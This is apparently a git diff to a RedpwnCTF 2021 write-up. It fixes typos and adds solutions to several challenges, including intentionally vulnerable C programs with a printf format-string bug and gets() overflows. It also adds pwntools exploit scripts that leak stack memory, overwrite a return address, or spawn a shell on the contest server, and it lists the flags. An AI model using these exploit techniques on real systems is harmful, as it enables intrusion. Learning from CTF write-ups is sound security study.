@@ -774,11 +774,11 @@ And after running the script, we spawned a shell and got the flag :
 
 ![Redpwn 2021 Writeup](/assets/img/ctfImages/redpwn2021/img16.png)
 
-This is easily one of the weirdest challenges that I have ever solved. We were given this <a href="https://github.com/Angmar2722/Angmar2722.github.io/blob/master/assets/ctfFiles/redpwn2021/bread" target="_blank">executable</a>. There would be a command given such as "add ingredients to the bowl" and we would have to find the right command such as "add flour" or "add yeast". There were some really weird situations such as when "the ingredients are added and stirred into a lumpy dough", the correct option was to "hide the bowl inside a box". TO avoid losing the game or story or whatever, we had to avoid the following conditions by the time we chose to go to sleep :
+This is easily one of the weirdest challenges that I have ever solved. We were given this <a href="https://github.com/Angmar2722/Angmar2722.github.io/blob/master/assets/ctfFiles/redpwn2021/bread" target="_blank">executable</a>. There would be a command given such as "add ingredients to the bowl" and we would have to find the right command such as "add flour" or "add yeast". There were some really weird situations such as when "the ingredients are added and stirred into a lumpy dough", the correct option was to "hide the bowl inside a box". To avoid losing the game or story or whatever, we had to avoid the following conditions by the time we chose to go to sleep :
 
 ![Redpwn 2021 Writeup](/assets/img/ctfImages/redpwn2021/img17.png)
 
-This was the story of a boy who just wanted to bake bread but in the process of doing so, he nearly set his house on fire.... And for some reason he didn't want his mom or brother to know that he was making bread. Weird D:
+This was the story of a boy who just wanted to bake bread but in the process of doing so, he nearly set his house on fire.... And for some reason he didn't want his mom or brother to know that he was baking bread. Weird D:
 
 The solve script :
 
@@ -860,3 +860,317 @@ We were given <a href="https://github.com/Angmar2722/Angmar2722.github.io/blob/m
 ## Printf-Please
 
 ![Redpwn 2021 Writeup](/assets/img/ctfImages/redpwn2021/img20.png)
+
+The source code :
+
+```c
+
+#include <stdio.h>
+#include <fcntl.h>
+
+int main(void)
+{
+  char buffer[0x200];
+  char flag[0x200];
+
+  setbuf(stdout, NULL);
+  setbuf(stdin, NULL);
+  setbuf(stderr, NULL);
+
+  memset(buffer, 0, sizeof(buffer));
+  memset(flag, 0, sizeof(flag));
+
+  int fd = open("flag.txt", O_RDONLY);
+  if (fd == -1) {
+    puts("failed to read flag. please contact an admin if this is remote");
+    exit(1);
+  }
+
+  read(fd, flag, sizeof(flag));
+  close(fd);
+
+  puts("what do you say?");
+
+  read(0, buffer, sizeof(buffer) - 1);
+  buffer[strcspn(buffer, "\n")] = 0;
+
+  if (!strncmp(buffer, "please", 6)) {
+    printf(buffer);
+    puts(" to you too!");
+  }
+}
+
+```
+The vulnerability lies in the implementation of `printf(buffer);` as it can be used to leak pointers to values in the stack.
+
+My solve script (this time I didn't use Google Docs and manually decode :D ):
+
+```python
+
+from pwn import *
+import re
+
+flag = b""
+payloadList = []
+
+for i in range(0, 17):
+    payload = ""
+    for i in range(30*i, 30*i + 30):
+        payload = payload + f"please %{i}$p " 
+    payloadList.append(payload)
+
+for i in range(len(payloadList)):
+    r = remote('mc.ax', 31569)
+    r.recvuntil("what do you say?\n")
+    r.sendline(payloadList[i])
+    output = r.recvline()
+    hexList = re.findall(r'[0x]\w+', output.decode())
+
+    for j in range(len(hexList)):
+        if( hexList[j].isascii() ):
+            temp = '{:x}'.format(int(hexList[j], 16) )
+            if (str(temp).isascii()):
+                #print(temp)
+                if ( len(str(temp)) == 1):
+                    temp = "0" + temp
+                if (temp == "a7d6c78336139"):
+                    flag = flag + bytes.fromhex("7d6c78336139")[::-1]
+                    print(flag)
+                    exit(0)
+                flag = flag + bytes.fromhex(str(temp))[::-1]
+
+```
+
+And after running the script, we got the flag :
+
+![Redpwn 2021 Writeup](/assets/img/ctfImages/redpwn2021/img21.png)
+
+<p> <b>Flag :</b> flag{pl3as3_pr1ntf_w1th_caut10n_9a3xl} </p>
+
+<br/>
+
+## Ret2generic-Flag-Reader
+
+![Redpwn 2021 Writeup](/assets/img/ctfImages/redpwn2021/img22.png)
+
+The source code :
+
+```python
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+void super_generic_flag_reading_function_please_ret_to_me()
+{
+  char flag[0x100] = {0};
+  FILE *fp = fopen("./flag.txt", "r");
+  if (!fp)
+  {
+    puts("no flag!! contact a member of rob inc");
+    exit(-1);
+  }
+  fgets(flag, 0xff, fp);
+  puts(flag);
+  fclose(fp);
+}
+
+int main(void)
+{
+  char comments_and_concerns[32];
+
+  setbuf(stdout, NULL);
+  setbuf(stdin, NULL);
+  setbuf(stderr, NULL);
+
+  puts("alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...");
+  puts("how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!");
+  puts("slap on some flavortext and there's no way rob will fire me now!");
+  puts("this is genius!! what do you think?");
+
+  gets(comments_and_concerns);
+}
+
+```
+
+Overflow the return address to wait for it..... `super_generic_flag_reading_function_please_ret_to_me()`. Yep! The solve script :
+
+```python
+
+from pwn import *
+
+addr = 0x4011f6
+payload = 40 * b'A' + p64(addr)
+r = remote('mc.ax', 31077)
+r.recvuntil("this is genius!! what do you think?\n")
+r.sendline(payload)
+print(r.recvall())
+
+```
+
+<p> <b>Flag :</b> flag{rob-loved-the-challenge-but-im-still-paid-minimum-wage} </p>
+
+<br/>
+
+## Beginner-Generic-Pwn-Number-0
+
+![Redpwn 2021 Writeup](/assets/img/ctfImages/redpwn2021/img23.png)
+
+The source code :
+
+```c
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+
+const char *inspirational_messages[] = {
+  "\"𝘭𝘦𝘵𝘴 𝘣𝘳𝘦𝘢𝘬 𝘵𝘩𝘦 𝘵𝘳𝘢𝘥𝘪𝘵𝘪𝘰𝘯 𝘰𝘧 𝘭𝘢𝘴𝘵 𝘮𝘪𝘯𝘶𝘵𝘦 𝘤𝘩𝘢𝘭𝘭 𝘸𝘳𝘪𝘵𝘪𝘯𝘨\"",
+  "\"𝘱𝘭𝘦𝘢𝘴𝘦 𝘸𝘳𝘪𝘵𝘦 𝘢 𝘱𝘸𝘯 𝘴𝘰𝘮𝘦𝘵𝘪𝘮𝘦 𝘵𝘩𝘪𝘴 𝘸𝘦𝘦𝘬\"",
+  "\"𝘮𝘰𝘳𝘦 𝘵𝘩𝘢𝘯 1 𝘸𝘦𝘦𝘬 𝘣𝘦𝘧𝘰𝘳𝘦 𝘵𝘩𝘦 𝘤𝘰𝘮𝘱𝘦𝘵𝘪𝘵𝘪𝘰𝘯\"",
+};
+
+int main(void)
+{
+  srand(time(0));
+  long inspirational_message_index = rand() % (sizeof(inspirational_messages) / sizeof(char *));
+  char heartfelt_message[32];
+  
+  setbuf(stdout, NULL);
+  setbuf(stdin, NULL);
+  setbuf(stderr, NULL);
+
+  puts(inspirational_messages[inspirational_message_index]);
+  puts("rob inc has had some serious layoffs lately and i have to do all the beginner pwn all my self!");
+  puts("can you write me a heartfelt message to cheer me up? :(");
+
+  gets(heartfelt_message);
+
+  if(inspirational_message_index == -1) {
+    system("/bin/sh");
+  }
+}
+
+```
+
+Overflow the buffer with "ff" to change the value of `inspirational_message_index` to -1 and then once a shell is spawned, read the flag. The solve script :
+
+```python
+
+from pwn import *
+
+payload = (b"\xff"*100)
+r = remote('mc.ax', 31199)
+
+r.recvuntil("can you write me a heartfelt message to cheer me up? :(\n")
+r.sendline(payload)
+r.interactive()
+
+```
+
+<p> <b>Flag :</b> flag{im-feeling-a-lot-better-but-rob-still-doesnt-pay-me} </p>
+
+<br/>
+
+## Baby
+
+![Redpwn 2021 Writeup](/assets/img/ctfImages/redpwn2021/img24.png)
+
+Contents of output.txt :
+
+```python
+
+n: 228430203128652625114739053365339856393
+e: 65537
+c: 126721104148692049427127809839057445790
+
+```
+
+Factorise the prime and print flag. The solve script :
+
+```python
+
+from Crypto.Util.number import long_to_bytes
+ 
+n = 228430203128652625114739053365339856393
+e= 65537
+ct=126721104148692049427127809839057445790
+ 
+p = 12546190522253739887
+q = 18207136478875858439
+ 
+eulerTotient = (p-1) * (q-1)
+ 
+d = pow(e, -1, eulerTotient)
+ 
+pt = pow(ct, d, n)
+decrypted = long_to_bytes(pt)
+ 
+print(decrypted)
+
+```
+
+<p> <b>Flag :</b> flag{68ab82df34} </p>
+
+<br/>
+
+## Wstrings
+
+![Redpwn 2021 Writeup](/assets/img/ctfImages/redpwn2021/img25.png)
+
+This was the <a href="https://github.com/Angmar2722/Angmar2722.github.io/blob/master/assets/ctfFiles/redpwn2021/wstrings" target="_blank">executable</a> given. I opened it in a disassembler and found the flag in the disassembly.
+
+<p> <b>Flag :</b> flag{flag{n0t_al1_str1ngs_ar3_sk1nny}} </p>
+
+<br/>
+
+## Scissor
+
+![Redpwn 2021 Writeup](/assets/img/ctfImages/redpwn2021/img26.png)
+
+Caesar cipher with right shift of 12.
+
+<p> <b>Flag :</b> flag{surround_this_flag_with_flag_format} </p>
+
+<br/>
+
+## Inspect-Me
+
+![Redpwn 2021 Writeup](/assets/img/ctfImages/redpwn2021/img27.png)
+
+Find the flag as a comment in the source code of the webpage.
+
+<p> <b>Flag :</b> flag{inspect_me_like_123} </p>
+
+<br/>
+
+## Survey
+
+![Redpwn 2021 Writeup](/assets/img/ctfImages/redpwn2021/img28.png)
+
+Fill out the survey and get the flag.
+
+<p> <b>Flag :</b> flag{thank5_f0r_play1ng_r3dpwnctf_2021!_zc9e848yg2gdhwxz} </p>
+
+<br/>
+
+## Discord
+
+![Redpwn 2021 Writeup](/assets/img/ctfImages/redpwn2021/img29.png)
+
+Find the flag in Redpwn's Discord server.
+
+<p> <b>Flag :</b> flag{chall3n63_au7h0r5h1p_1nfl4710n} </p>
+
+<br/>
+
+## Sanity-Check
+
+![Redpwn 2021 Writeup](/assets/img/ctfImages/redpwn2021/img30.png)
+
+Enter the flag in the challenge description.
+
+<p> <b>Flag :</b> flag{1_l0v3_54n17y_ch3ck_ch4ll5} </p>
+
+<br/>
